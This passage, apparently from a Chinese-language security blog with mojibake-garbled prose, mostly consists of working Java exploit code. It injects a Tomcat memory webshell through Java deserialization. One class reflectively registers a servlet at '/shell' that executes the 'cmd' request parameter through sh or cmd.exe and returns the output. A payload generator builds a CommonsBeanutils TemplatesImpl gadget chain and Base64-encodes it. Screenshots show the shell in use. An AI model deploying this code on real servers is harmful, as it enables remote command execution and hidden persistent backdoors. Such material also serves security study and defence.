class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.Wrapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationFilterChain;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilTemplatesImpl</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title class_">Servlet</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> ServletConfig config;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig var1)</span> <span class="keyword">throws</span> ServletException&#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.config;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Servlet Info&quot;</span>;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> servletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">            isLinux = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> servletResponse.getWriter();</span><br><span class="line">        out.println(output);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFinalStatic</span><span class="params">(Field field)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">        modifiersField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        modifiersField.setInt(field, field.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvilTemplatesImpl</span><span class="params">(String abc)</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvilTemplatesImpl</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">WRAP_SAME_OBJECT_FIELD</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>).getDeclaredField(<span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">lastServicedRequestField</span> <span class="operator">=</span> ApplicationFilterChain.class.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">lastServicedResponseField</span> <span class="operator">=</span> ApplicationFilterChain.class.getDeclaredField(<span class="string">&quot;lastServicedResponse&quot;</span>);</span><br><span class="line"></span><br><span class="line">        setFinalStatic(WRAP_SAME_OBJECT_FIELD);</span><br><span class="line">        setFinalStatic(lastServicedRequestField);</span><br><span class="line">        setFinalStatic(lastServicedResponseField);</span><br><span class="line"></span><br><span class="line">        ThreadLocal&lt;ServletRequest&gt; lastServicedRequest = (ThreadLocal&lt;ServletRequest&gt;) lastServicedRequestField.get(<span class="literal">null</span>);</span><br><span class="line">        ThreadLocal&lt;ServletResponse&gt; lastServicedResponse = (ThreadLocal&lt;ServletResponse&gt;) lastServicedResponseField.get(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!WRAP_SAME_OBJECT_FIELD.getBoolean(<span class="literal">null</span>) || lastServicedRequest == <span class="literal">null</span> || lastServicedResponse == <span class="literal">null</span>)&#123;</span><br><span class="line">            WRAP_SAME_OBJECT_FIELD.setBoolean(<span class="literal">null</span>,<span class="literal">true</span>);</span><br><span class="line">            lastServicedRequestField.set(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>());</span><br><span class="line">            lastServicedResponseField.set(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>());</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            AddMemoryShell(lastServicedRequest, lastServicedResponse);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">AddMemoryShell</span><span class="params">(ThreadLocal&lt;ServletRequest&gt; lastServicedRequest, ThreadLocal&lt;ServletResponse&gt; lastServicedResponse)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ServletRequest</span> <span class="variable">servletRequest</span> <span class="operator">=</span> lastServicedRequest.get();</span><br><span class="line">        <span class="type">ServletResponse</span> <span class="variable">servletResponse</span> <span class="operator">=</span> lastServicedResponse.get();</span><br><span class="line"></span><br><span class="line">        <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> servletRequest.getServletContext();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">context</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        context.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) context.get(servletContext);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">context1</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        context1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) context1.get(applicationContext);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//è·å¾—StandardContextåæŒ‰ç…§åˆ†æçš„æ­¥éª¤åšå°±è¡Œäº†</span></span><br><span class="line">        <span class="type">Wrapper</span> <span class="variable">EvilWrapper</span> <span class="operator">=</span> standardContext.createWrapper();</span><br><span class="line">        <span class="comment">//ï¼ˆé‡ç‚¹ï¼‰æ­¤å¤„ä¸åˆ©ç”¨æ— å‚æ„é€ æ–¹æ³•è·å¾—EvilTemplatesImplå¯¹è±¡æ˜¯é¿å…å¾ªç¯æ‰§è¡Œæ— å‚æ„é€ æ–¹æ³•ä¸­çš„ä»£ç ï¼</span></span><br><span class="line">        <span class="type">Servlet</span> <span class="variable">evilTemplates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EvilTemplatesImpl</span>(<span class="string">&quot;rainb0w&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">ClassName</span> <span class="operator">=</span> evilTemplates.getClass().getSimpleName();</span><br><span class="line">        EvilWrapper.setName(ClassName);</span><br><span class="line">        EvilWrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">        EvilWrapper.setServlet(evilTemplates);</span><br><span class="line">        EvilWrapper.setServletClass(evilTemplates.getClass().getName());</span><br><span class="line"></span><br><span class="line">        standardContext.addChild(EvilWrapper);</span><br><span class="line">        standardContext.addServletMappingDecoded(<span class="string">&quot;/shell&quot;</span>, ClassName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ— æ³•ç›´æ¥newä¸€ä¸ªServletå¯¹è±¡ï¼Œå…·ä½“åŸå› æœªçŸ¥ï¼ˆåç»­ååºåˆ—åŒ–æ³¨å…¥Tomcat-Filterå‹å†…å­˜é©¬æ—¶åŒæ ·æ— æ³•ç›´æ¥åˆ›å»ºä¸€ä¸ªFilterå¯¹è±¡ï¼‰ã€‚å› æ­¤é‡‡ç”¨åŠæ³•çš„æ˜¯è®©EvilTemplatesImplå®ç°Servletæ¥å£ï¼Œæ¥ç€é‡å†™æ¥å£ä¸­çš„æ–¹æ³•ï¼Œå°†æ¥å—å‚æ•°æ‰§è¡Œå‘½ä»¤å¹¶å›æ˜¾çš„éƒ¨åˆ†å†™å…¥serviceæ–¹æ³•ä¸­ï¼Œæœ€åæˆ‘ä»¬ç›´æ¥åˆ›å»ºä¸€ä¸ªEvilTemplatesImplå¯¹è±¡å³æ˜¯ä¸€ä¸ªServletå¯¹è±¡ã€‚<strong>ä½†æ˜¯åˆ‡è®°ä¸è¦ä½¿ç”¨æ— å‚æ„é€ æ–¹æ³•åˆ›å»ºï¼Œå› ä¸ºååºåˆ—åŒ–æ—¶æˆ‘ä»¬æ— å‚æ„é€ æ–¹æ³•ä¸­çš„ä»£ç æ˜¯é»˜è®¤æ‰§è¡Œçš„ï¼Œå¦‚æœè¿™é‡Œåˆ›å»ºå¯¹è±¡æ—¶è¿˜ç”¨æ— å‚æ„é€ æ–¹æ³•ï¼Œé‚£ä¹ˆå°±ä¼šé€ æˆé€’å½’ã€‚</strong>å®é™…æ•ˆæœå¦‚ä¸‹ï¼š</p><p>é¦–å…ˆå°†ç”Ÿæˆçš„payloadè¿›è¡Œurlç¼–ç å‘é€ï¼š</p><p><a href="https://pic.imgdb.cn/item/64d26d701ddac507cc03df1c.jpg" title="image-20230803115541939" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26d701ddac507cc03df1c.jpg" alt="image-20230803115541939"></a></p><p>æ¥ç€è¿›å…¥&#x2F;shellå³å¯æ‰§è¡Œå‘½ä»¤ï¼š</p><p><a href="https://pic.imgdb.cn/item/64d26d821ddac507cc040f4a.jpg" title="image-20230803115508565" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26d821ddac507cc040f4a.jpg" alt="image-20230803115508565"></a></p><p>ä»¥ä¸‹æ˜¯ç¬¬äºŒç§æ–¹æ³•çš„EXPï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getpayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;</span><br><span class="line">                ClassPool.getDefault().get(EvilTemplatesImpl1.class.getName()).toBytecode()</span><br><span class="line">        &#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">        <span class="comment">// stub data for replacement later</span></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj, obj&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> queue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@org</span>.junit.jupiter.api.Test</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test1</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">payload</span> <span class="operator">=</span> getpayload();</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        outputStream.writeObject(payload);</span><br><span class="line">        outputStream.flush();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">codes</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());</span><br><span class="line">        System.out.println(codes);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ¶æ„æ¨¡æ¿ç±»å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.Wrapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilTemplatesImpl1</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title class_">Servlet</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> ServletConfig config;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig var1)</span> <span class="keyword">throws</span> ServletException&#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.config;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Servlet 